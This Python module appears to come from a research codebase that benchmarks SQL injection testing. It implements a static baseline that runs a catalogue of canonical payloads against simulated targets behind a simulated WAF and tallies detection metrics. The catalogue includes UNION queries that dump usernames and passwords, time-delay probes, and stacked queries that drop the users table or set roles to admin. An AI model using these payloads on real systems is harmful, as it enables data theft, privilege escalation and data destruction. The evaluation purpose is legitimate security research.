"""Static, signature-based baseline (a SQLMap-style reference).

Represents the "Traditional SQL Injection Testing" class from Section II: a
fixed catalogue of canonical payloads tried in a fixed order, with no learning
and no context-aware obfuscation. Used as the comparison point in Section IV.
"""
from __future__ import annotations

from typing import Dict, List

from .analyzer import Analyzer
from .environment import SimulatedTarget, evasion_score
from .metrics import MetricAccumulator
from .config import STRATEGIES

# Canonical, well-known payloads — exactly the signatures a WAF is tuned to flag.
_STATIC_PAYLOADS: Dict[str, List[str]] = {
    "union_based": ["' UNION SELECT NULL,NULL-- ", "' UNION SELECT username,password FROM users-- ", "1' UNION SELECT NULL-- -"],
    "error_based": ["' AND extractvalue(1,concat(0x7e,version()))-- ", "'", "\" AND updatexml(1,concat(0x7e,user()),1)-- "],
    "boolean_blind": ["' OR '1'='1", "' OR 1=1-- ", "' AND 1=1-- "],
    "time_blind": ["' OR SLEEP(5)-- ", "'; WAITFOR DELAY '0:0:5'-- ", "' AND BENCHMARK(5000000,MD5(1))-- "],
    "stacked_queries": ["'; DROP TABLE users-- ", "'; UPDATE users SET role='admin'-- ", "'; SELECT pg_sleep(2)-- "],
    "second_order": ["admin'-- ", "' OR '1'='1", "x'||(SELECT user())||'"],
}


def canonical_payload(strategy: str) -> str:
    """First canonical (non-obfuscated) payload for a strategy.

    Represents the structural, signature-based payloads used by traditional
    tools and by purely-structural RL approaches that lack semantic synthesis.
    """
    return _STATIC_PAYLOADS.get(strategy, _STATIC_PAYLOADS["union_based"])[0]


def canonical_payloads(strategy: str) -> List[str]:
    """All canonical payloads for a strategy (used for multi-attempt testing)."""
    return _STATIC_PAYLOADS.get(strategy, _STATIC_PAYLOADS["union_based"])


class StaticBaseline:
    """Tries every strategy's canonical payloads against every target."""

    def __init__(self, analyzer: Analyzer) -> None:
        self.analyzer = analyzer

    def run(self, targets: List[SimulatedTarget]) -> MetricAccumulator:
        m = MetricAccumulator(name="Static-Baseline")
        for target in targets:
            for strategy in STRATEGIES:
                ground_truth = strategy in target.vulnerable_strategies
                detected = False
                for payload in _STATIC_PAYLOADS[strategy]:
                    if target.waf.enabled:
                        m.waf_encounters += 1
                        if not target.waf.inspect(payload):
                            m.waf_bypasses += 1
                    response = target.execute(strategy, payload)
                    result = self.analyzer.analyze(strategy, response)
                    m.total_actions += 1
                    m.latencies_ms.append(response.latency_ms)
                    if result.vulnerable:
                        detected = True
                        break
                # Confusion-matrix bookkeeping (per target/strategy pair).
                m.record_strategy(strategy, detected and ground_truth)
                if ground_truth and detected:
                    m.true_positive += 1
                elif ground_truth and not detected:
                    m.false_negative += 1
                elif not ground_truth and detected:
                    m.false_positive += 1
                else:
                    m.true_negative += 1
        return m
